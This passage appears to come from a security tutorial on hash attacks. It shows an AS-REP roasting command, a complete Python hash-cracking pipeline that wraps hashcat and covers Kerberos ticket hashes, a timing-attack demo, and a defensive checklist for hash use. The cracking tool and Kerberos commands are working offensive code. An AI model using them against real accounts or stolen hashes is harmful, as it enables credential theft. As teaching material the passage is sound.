    -format hashcat -outputfile asrep_hashes.txt \
    -dc-ip DC_IP

# Cracking
# $krb5asrep$23$... → mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

## 5. Hash Attack Automation

A Python script that automates various hash attack techniques. Processes the pipeline from hash type identification through cracking tool invocation.

```python
#!/usr/bin/env python3
"""
Automated hash cracking pipeline CLI
Usage: python3 hash_cracker.py crack --hash 5f4dcc3b5aa765d61d8327deb882cf99
       python3 hash_cracker.py crack --file hashes.txt --wordlist rockyou.txt
       python3 hash_cracker.py identify --hash '$6$rounds=5000$salt$HASH'
"""

from __future__ import annotations
import argparse
import hashlib
import json
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path


# ── Hash pattern definitions ───────────────────────────────────────────

HASH_SIGNATURES: list[tuple[str, str, int]] = [
    # (pattern, name, hashcat_mode)
    (r"^\$krb5tgs\$23\$.+",    "Kerberoast-RC4",   13100),
    (r"^\$krb5tgs\$18\$.+",    "Kerberoast-AES",   19700),
    (r"^\$krb5asrep\$23\$.+",  "AS-REP-RC4",       18200),
    (r"^\$krb5asrep\$18\$.+",  "AS-REP-AES",       19800),
    (r"^\$2[ayb]\$.{56}$",     "bcrypt",            3200),
    (r"^\$6\$.+",              "sha512crypt",        1800),
    (r"^\$5\$.+",              "sha256crypt",        7400),
    (r"^\$1\$.+",              "md5crypt",            500),
    (r"^\$y\$.+",              "yescrypt",           None),
    (r"^[a-f0-9]{128}$",       "SHA-512",            1700),
    (r"^[a-f0-9]{64}$",        "SHA-256",            1400),
    (r"^[a-f0-9]{56}$",        "SHA-224",            1300),
    (r"^[a-f0-9]{40}$",        "SHA-1",               100),
    (r"^[a-f0-9]{32}$",        "MD5/NTLM",            0),  # 0 → dict, also try 1000
]

NTLM_EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"


def identify_hash(h: str) -> list[tuple[str, int | None]]:
    """Hash string → [(type_name, hashcat_mode), ...]"""
    results: list[tuple[str, int | None]] = []
    for pattern, name, mode in HASH_SIGNATURES:
        if re.match(pattern, h, re.IGNORECASE):
            results.append((name, mode))
            # For 32-char hex, also add NTLM mode
            if name == "MD5/NTLM":
                results.append(("NTLM", 1000))
    return results or [("Unknown", None)]


# ── Local dictionary cracker ────────────────────────────────────

_DIGEST_FUNCS: dict[str, object] = {
    "md5":    hashlib.md5,
    "sha1":   hashlib.sha1,
    "sha256": hashlib.sha256,
    "sha512": hashlib.sha512,
}


def crack_local(hash_str: str, wordlist: Path,
                algo: str = "md5") -> str | None:
    """Pure Python dictionary cracking (MD5/SHA family)"""
    fn = _DIGEST_FUNCS.get(algo)
    if fn is None:
        return None
    h_lower = hash_str.lower()
    try:
        with wordlist.open("r", encoding="latin-1", errors="replace") as fp:
            for line in fp:
                word = line.rstrip("\n")
                if fn(word.encode()).hexdigest() == h_lower:
                    return word
    except OSError as e:
        print(f"[-] Wordlist error: {e}", file=sys.stderr)
    return None


# ── Hashcat wrapper ─────────────────────────────────────────────

def crack_hashcat(
    hash_str: str,
    mode: int,
    wordlist: Path,
    rules: list[Path] | None = None,
    brute_mask: str | None = None,
    timeout: int = 300,
) -> str | None:
    """Run hashcat and return cracking result"""
    tmp = Path("/tmp/_hc_target.txt")
    tmp.write_text(hash_str + "\n")

    cmd = ["hashcat", "-m", str(mode), str(tmp), "--quiet",
           "--potfile-disable", "--status-timer=10"]

    if brute_mask:
        cmd += ["-a", "3", brute_mask]
    else:
        cmd += [str(wordlist)]
        for r in (rules or []):
            cmd += ["-r", str(r)]

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        # Extract result with hashcat --show
        show = subprocess.run(
            ["hashcat", "-m", str(mode), str(tmp), "--show", "--potfile-disable"],
            capture_output=True, text=True, timeout=10,
        )
        for line in show.stdout.splitlines():
            if ":" in line:
                return line.split(":", 1)[-1].strip()
    except FileNotFoundError:
        print("[-] hashcat not installed", file=sys.stderr)
    except subprocess.TimeoutExpired:
        print(f"[-] hashcat timeout ({timeout}s)", file=sys.stderr)
    return None


# ── Main cracking pipeline ───────────────────────────────────

@dataclass
class CrackResult:
    hash_str: str
    hash_type: str = "Unknown"
    password: str | None = None
    method: str = ""
    errors: list[str] = field(default_factory=list)


def crack_pipeline(
    hash_str: str,
    wordlist: Path,
    rules: list[Path] | None = None,
    use_hashcat: bool = True,
    timeout: int = 300,
) -> CrackResult:
    res = CrackResult(hash_str=hash_str)
    types = identify_hash(hash_str)
    res.hash_type = " / ".join(t for t, _ in types)
    print(f"[*] {hash_str[:32]}...  Type: {res.hash_type}")

    # 1. Python local cracking (MD5/SHA1)
    for name, _ in types:
        algo = {"MD5/NTLM": "md5", "SHA-1": "sha1",
                "SHA-256": "sha256", "SHA-512": "sha512"}.get(name)
        if algo:
            print(f"    [Python] {algo} dictionary cracking...")
            pw = crack_local(hash_str, wordlist, algo)
            if pw:
                res.password, res.method = pw, f"python_{algo}"
                return res

    # 2. hashcat
    if use_hashcat:
        for name, mode in types:
            if mode is None:
                continue
            print(f"    [hashcat -m {mode}] dictionary...")
            pw = crack_hashcat(hash_str, mode, wordlist, rules, timeout=timeout)
            if pw:
                res.password, res.method = pw, f"hashcat_dict_{name}"
                return res

            if mode in (0, 100, 1000, 1400):   # Brute force only for fast hashes
                print(f"    [hashcat -m {mode}] brute (6 chars)...")
                pw = crack_hashcat(hash_str, mode, wordlist,
                                   brute_mask="?l?l?l?l?l?l", timeout=60)
                if pw:
                    res.password, res.method = pw, f"hashcat_brute_{name}"
                    return res

    print("    [-] Cracking failed")
    return res


# ── CLI ──────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="Hash cracking pipeline")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # identify
    id_p = sub.add_parser("identify", help="Identify hash type")
    id_p.add_argument("--hash", required=True)

    # crack
    cr_p = sub.add_parser("crack", help="Crack hash")
    cr_p.add_argument("--hash", help="Single hash")
    cr_p.add_argument("--file", type=Path, help="Hash list file (one per line)")
    cr_p.add_argument("--wordlist", type=Path,
                      default=Path("/usr/share/wordlists/rockyou.txt"))
    cr_p.add_argument("--rules", nargs="*", type=Path)
    cr_p.add_argument("--no-hashcat", action="store_true")
    cr_p.add_argument("--timeout", type=int, default=300)
    cr_p.add_argument("--output", type=Path, help="Save results as JSON")

    args = parser.parse_args()

    if args.cmd == "identify":
        types = identify_hash(args.hash)
        print(f"Hash: {args.hash}")
        for name, mode in types:
            hc = f"hashcat -m {mode}" if mode is not None else "N/A"
            print(f"  {name:20s}  {hc}")
        return

    hashes: list[str] = []
    if args.hash:
        hashes.append(args.hash)
    if args.file:
        try:
            hashes.extend(
                l.strip() for l in args.file.read_text().splitlines() if l.strip()
            )
        except OSError as e:
            print(f"[-] File error: {e}", file=sys.stderr)
            sys.exit(1)

    if not hashes:
        print("[-] Specify --hash or --file.", file=sys.stderr)
        sys.exit(1)

    results: list[dict] = []
    for h in hashes:
        res = crack_pipeline(
            h, args.wordlist, args.rules or [],
            not args.no_hashcat, args.timeout,
        )
        if res.password:
            print(f"[+] {res.hash_str[:32]}... → {res.password}  ({res.method})")
        results.append({"hash": res.hash_str, "type": res.hash_type,
                        "password": res.password, "method": res.method})

    if args.output:
        args.output.write_text(json.dumps(results, indent=2, ensure_ascii=False))
        print(f"[*] Results saved: {args.output}")

    cracked = sum(1 for r in results if r["password"])
    print(f"\n[Summary] {cracked}/{len(results)} cracked successfully")


if __name__ == "__main__":
    main()
```

---

## 6. HMAC and MAC Attacks

### Timing Attacks

A timing attack infers secret information by measuring minute differences in computation time. Use constant-time comparison functions instead of regular string comparison.

```python
#!/usr/bin/env python3
"""
Timing attack demo & safe HMAC comparison
Usage: python3 timing_attack.py demo
       python3 timing_attack.py safe-compare --a "abc" --b "abc"
"""

from __future__ import annotations
import argparse
import hmac
import statistics
import sys
import time


# ── Vulnerable comparison (timing attack target) ──────────────────────────

def vulnerable_compare(a: str, b: str) -> bool:
    """
    Vulnerable: returns immediately at first mismatch
    → Execution time varies with the number of matching bytes
    """
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False      # Early return → time leak
    return True


# ── Constant-time comparison (safe) ─────────────────────────────────

def safe_compare(a: str, b: str) -> bool:
    """hmac.compare_digest — always compares fully, no time leak"""
    return hmac.compare_digest(a.encode(), b.encode())


# ── Timing attack simulation ───────────────────────────────────

def timing_attack(
    target: str,
    charset: str = "0123456789abcdef",
    samples: int = 200,
    verbose: bool = True,
) -> str:
    """
    Byte-by-byte timing attack using vulnerable_compare
    The character that takes longest at each position = matching character

    Note: Real network attacks have much more measurement noise,
          requiring thousands to tens of thousands of samples.
    """
    recovered = ""

    for pos in range(len(target)):
        char_times: dict[str, float] = {}

        for ch in charset:
            guess = recovered + ch + "0" * (len(target) - len(recovered) - 1)
            measurements: list[int] = []

            for _ in range(samples):
                t0 = time.perf_counter_ns()
                vulnerable_compare(guess, target)
                t1 = time.perf_counter_ns()
                measurements.append(t1 - t0)

            # Use median (to remove outliers)
            char_times[ch] = statistics.median(measurements)

        best = max(char_times, key=char_times.get)
        recovered += best

        if verbose:
            top3 = sorted(char_times.items(), key=lambda kv: kv[1], reverse=True)[:3]
            print(f"  Position {pos:02d}: '{best}'  Recovered: {recovered!r:20s}  "
                  f"Top3={[(c, f'{t:.0f}ns') for c, t in top3]}")

    return recovered


def run_demo() -> None:
    """Vulnerable vs safe comparison demo"""
    secret_mac = "deadbeef1234"
    print(f"=== Timing Attack Demo ===")
    print(f"Actual MAC: {secret_mac}\n")

    print("[*] Starting timing attack (vulnerable_compare)...")
    recovered = timing_attack(secret_mac, samples=300)
    success = recovered == secret_mac
    print(f"\n[{'+'if success else '-'}] Recovery result: {recovered!r}  "
          f"({'Success' if success else 'Failure'})\n")

    print("[*] Verifying safe_compare accuracy")
    print(f"  Correct MAC comparison: {safe_compare(secret_mac, secret_mac)}")
    print(f"  Wrong MAC comparison  : {safe_compare(secret_mac, 'deadbeef0000')}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Timing attack demo")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("demo", help="Run vulnerable vs safe comparison demo")

    atk = sub.add_parser("attack", help="Run timing attack")
    atk.add_argument("--target",  required=True, help="Target string")
    atk.add_argument("--charset", default="0123456789abcdef")
    atk.add_argument("--samples", type=int, default=200)

    cmp = sub.add_parser("safe-compare", help="Constant-time comparison")
    cmp.add_argument("--a", required=True)
    cmp.add_argument("--b", required=True)

    args = parser.parse_args()

    if args.cmd == "demo":
        run_demo()
    elif args.cmd == "attack":
        print(f"[*] Timing attack: target={args.target!r}")
        result = timing_attack(args.target, args.charset, args.samples)
        print(f"\n[Result] {result!r}")
    elif args.cmd == "safe-compare":
        match = safe_compare(args.a, args.b)
        print(f"Comparison result: {'Match' if match else 'Mismatch'}")
        sys.exit(0 if match else 1)


if __name__ == "__main__":
    if len(sys.argv) == 1:
        run_demo()
    else:
        main()
```

---

## 7. Hash Security Checklist

```
Password storage:
  □ Use bcrypt, Argon2id, or scrypt (slow hashes)
  □ Never use MD5, SHA-1, or SHA-256 alone
  □ Periodically increase cost factor (as hardware improves)
  □ Auto-generate salts (let the library handle it)

MAC/Signatures:
  □ Use HMAC (never simple H(key || msg))
  □ Use hmac.compare_digest() for constant-time comparison
  □ Use HMAC-SHA256 or stronger

File integrity:
  □ Use SHA-256 or stronger
  □ Never use MD5/SHA-1 alone
  □ Consider including key-based authentication with HMAC

Certificates/Signatures:
  □ Use SHA-256 signing algorithm
  □ Reject certificates signed with SHA-1
```
